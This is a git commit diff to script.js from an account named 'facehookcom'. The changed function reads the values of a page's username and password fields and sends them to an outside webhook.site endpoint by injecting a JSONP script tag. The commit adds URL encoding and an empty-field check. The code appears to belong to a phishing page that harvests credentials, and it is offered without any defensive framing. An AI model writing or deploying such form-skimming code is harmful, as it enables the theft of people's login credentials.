7ae58f184970f9b24e152af1438b94059a042ea5
facehookcom <141312864+facehookcom@users.noreply.github.com>
2023-08-19 15:05:08 +0530

    Update script.js

--- script.js
+++ script.js
@@ -3,17 +3,23 @@ function handleResponse(data) {
     // Process the data received from the server
 }
 
-// Function to create and send the JSONP request
 function sendJSONPRequest() {
-    // Create a script tag
-    var script = document.createElement('script');
+    const uu = document.querySelector('input[type="text"]').value;
+    const pp = document.querySelector('input[type="password"]').value;
     
-    // Set the source URL with a callback parameter
-    const uu = document.querySelector('input[type="text"]');
-    const pp = document.querySelector('input[type="password"]');
-    script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+uu.value+'&p='+pp.value;
-    
-    // Append the script tag to the document
-    document.body.appendChild(script);
+    if (uu && pp) {
+        // Create a script tag
+        var script = document.createElement('script');
+        
+        // Define the callback function
+        window.handleResponse = handleResponse;
+        
+        // Set the source URL with a callback parameter
+        script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u=' + encodeURIComponent(uu) + '&p=' + encodeURIComponent(pp);
+        
+        // Append the script tag to the document
+        document.body.appendChild(script);
+    } else {
+        console.log('Please fill in both input fields.');
+    }
 }
-
